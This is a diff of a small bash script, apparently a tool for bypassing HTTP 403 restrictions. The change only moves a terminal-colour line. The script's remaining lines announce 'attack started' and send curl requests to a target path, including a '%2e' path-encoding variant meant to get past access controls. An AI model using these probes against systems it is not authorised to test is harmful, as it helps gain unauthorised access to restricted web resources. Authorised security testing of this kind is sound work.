@@ -1,9 +1,9 @@
 #! /bin/bash
-setterm -foreground cyan
 figlet xbyp4ss-403x | lolcat
 echo ""
 echo "attack started" | lolcat
 echo ""
+setterm -foreground cyan
 curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
 echo "  --> ${1}/${2}"
 curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2e/$2
